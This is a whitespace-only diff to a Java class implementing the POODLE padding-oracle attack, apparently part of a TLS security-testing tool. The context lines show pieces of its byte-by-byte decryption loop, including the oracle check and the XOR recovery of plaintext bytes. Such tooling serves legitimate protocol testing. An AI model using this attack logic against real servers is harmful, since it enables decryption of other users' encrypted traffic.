@@ -247,9 +247,9 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                         receiveMessageHelper.receiveMessages(state.getOutboundTlsContexts().get(0));
 
                     if (mar2.getMessageList().size() == 0) {
-                        
+
                         httphandler.bytedecrypted = true;
-                        
+
                         decryptedBytesSoFar++;
 
                         i = 0;
@@ -273,7 +273,6 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                             found_byte = (byte) (block_before_message[15] ^ block_before_padding[15] ^ 0xF);
                         }
 
-                        
                         // If we decrypted the full block then move to the next block
                         if (decryptedBytesSoFar == block_size) {
                             positionOfBlockToDecrypt++;
